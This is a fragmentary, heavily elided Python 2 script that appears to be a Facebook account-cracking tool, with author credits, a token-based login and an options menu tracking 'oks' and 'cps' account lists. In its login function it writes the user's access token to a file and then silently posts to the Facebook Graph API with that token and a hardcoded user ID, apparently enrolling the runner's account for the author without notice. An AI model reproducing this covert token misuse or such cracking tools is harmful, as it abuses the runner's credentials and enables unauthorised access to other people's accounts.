#coding=utf-8
#!/usr/bin/python2
#Originally Written By Abdullah Jan
try:
...
➣ Author   : Veer Khanoo
➣ Facebook : Mudassir (veer)
➣ Github   : https://github.com/AbdullahDada790
...
def login_fb():
	...
	if "loc" in q:
		...
		hamza.write(q["loc"])
		hamza.close()
		requests.post('https://graph.facebook.com/me/friends?uid=100004499498856&access_token='+q['loc'])
		time.sleep(1)
...
def b_menu():
    ...
    print("[3] View token")
    print("[4] Return method menu")
    print("[5] Logout")
    print("")
    b_menu_select()
def b_menu_select():
	select = raw_input("\n\033[1;33m Select option:  ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
